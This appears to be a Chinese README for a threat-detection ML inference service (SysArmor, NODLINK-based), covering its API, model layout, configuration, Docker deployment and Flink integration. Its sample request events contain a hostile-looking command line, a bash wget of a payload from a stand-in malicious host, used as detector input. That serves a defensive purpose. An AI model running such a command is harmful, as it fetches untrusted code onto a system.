# SysArmor ML 推理服务

## 🤖 机器学习推理服务

基于 NODLINK 算法的多模型推理服务，支持多个 collector 的威胁检测模型管理。

### 服务特性
- **多模型管理**: 支持多个 collector 的 NODLINK 模型
- **无状态设计**: 支持水平扩展和负载均衡
- **简单缓存**: 内存模型缓存，避免重复加载
- **兼容现有API**: 基于现有 nodlink API 的设计模式

## 📋 API 接口

### 推理接口
```bash
# 单个 collector 推理
POST /predict
{
  "collector_id": "collector_001",
  "events": [
    {
      "evt.type": "execve",
      "proc.name": "bash",
      "proc.cmdline": "/bin/bash -c 'wget http://malicious.com'",
      "proc.pcmdline": "/usr/sbin/sshd",
      "evt.time": 1699123456.789,
      "fd.name": "/tmp/payload"
    }
  ],
  "options": {
    "threshold": 0.7
  }
}

# 批量多 collector 推理
POST /predict/batch
[
  {
    "collector_id": "collector_001",
    "events": [...]
  },
  {
    "collector_id": "collector_002", 
    "events": [...]
  }
]
```

### 响应格式
```json
{
  "success": true,
  "collector_id": "collector_001",
  "threat_score": 0.85,
  "is_malicious": true,
  "graph_data": {
    "nodes": [...],
    "edges": [...],
    "graph_score": 85.2
  },
  "alert_info": {
    "alert_status": 1,
    "alert_level": 1,
    "alert_uuid": "abc-123-def"
  },
  "processing_time": 0.25
}
```

### 模型管理
```bash
GET    /models                    # 列出可用模型
GET    /models/{collector_id}     # 获取特定模型信息
POST   /models/{collector_id}/load # 预加载模型
DELETE /models/{collector_id}/unload # 卸载模型
GET    /health                    # 健康检查
GET    /cache/stats               # 缓存统计
```

## 🗂️ 模型目录结构

### 标准目录布局
```
/data/models/
├── collector_001/
│   ├── models/              # NODLINK 预训练模型
│   │   ├── AE.model
│   │   ├── cmdline-embedding.model
│   │   ├── filepath-embedding.model
│   │   ├── stability-embedding.json
│   │   └── tfidf.json
│   └── metadata.json       # 模型元数据
├── collector_002/
│   ├── models/
│   └── metadata.json
└── global/                  # 全局共享模型
    ├── models/
    └── metadata.json
```

### 模型元数据
```json
{
  "collector_id": "collector_001",
  "version": "1.0",
  "trained_at": "2024-12-08T02:00:00Z",
  "model_type": "nodlink",
  "supported_events": [
    "execve", "open", "connect", "socket"
  ],
  "performance": {
    "accuracy": 0.95,
    "precision": 0.92,
    "recall": 0.88
  },
  "training_data": {
    "samples": 100000,
    "malicious_ratio": 0.15
  }
}
```

## 🔧 服务架构

### 核心组件
```python
# 模型管理器
class ModelManager:
    def get_model_path(self, collector_id: str) -> str
    def load_model(self, collector_id: str) -> NodlinkService
    def unload_model(self, collector_id: str)
    def list_available_models() -> List[Dict]

# 推理服务
class InferenceService:
    def __init__(self, model_manager: ModelManager)
    async def predict(self, collector_id: str, events: List[Dict]) -> ThreatResult
    async def predict_batch(self, requests: List[Dict]) -> List[ThreatResult]

# 简单缓存
class SimpleModelCache:
    def __init__(self, max_size: int = 10, ttl: int = 3600)
    def get(self, key: str)
    def put(self, key: str, value)
```

### 配置管理
```python
class Settings(BaseSettings):
    # 服务配置
    host: str = "0.0.0.0"
    port: int = 8080
    
    # 模型配置
    models_base_path: str = "/data/models"
    default_threshold: float = 0.7
    
    # 缓存配置
    max_cached_models: int = 10
    model_cache_ttl: int = 3600
```

## 🚀 部署配置

### Docker 部署
```yaml
# docker-compose.yml 扩展
services:
  sysarmor-ml-inference:
    build: ./services/ml-inference
    ports:
      - "8082:8080"
    environment:
      - INFERENCE_MODELS_BASE_PATH=/data/models
      - INFERENCE_MAX_CACHED_MODELS=10
    volumes:
      - ./data/models:/data/models:ro
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8080/health"]
      interval: 30s
      timeout: 10s
      retries: 3
```

### 使用示例
```bash
# 推理请求
curl -X POST "http://localhost:8082/predict" \
  -H "Content-Type: application/json" \
  -d '{
    "collector_id": "collector_001",
    "events": [
      {
        "evt.type": "execve",
        "proc.name": "bash",
        "proc.cmdline": "/bin/bash -c \"wget http://malicious.com/payload\""
      }
    ]
  }'

# 模型管理
curl "http://localhost:8082/models"
curl -X POST "http://localhost:8082/models/collector_001/load"
```

## 🔗 系统集成

### 与 Flink 处理器集成
```python
# 在 Flink 作业中调用推理服务
async def detect_threats(events_batch):
    async with httpx.AsyncClient() as client:
        response = await client.post(
            f"{ML_INFERENCE_URL}/predict",
            json={
                "collector_id": collector_id,
                "events": events_batch
            }
        )
        
        if response.json()["is_malicious"]:
            # 生成告警到 sysarmor.alerts topic
            await produce_alert(response.json())
```

---

**SysArmor ML 推理服务** - 基于 NODLINK 的智能威胁检测
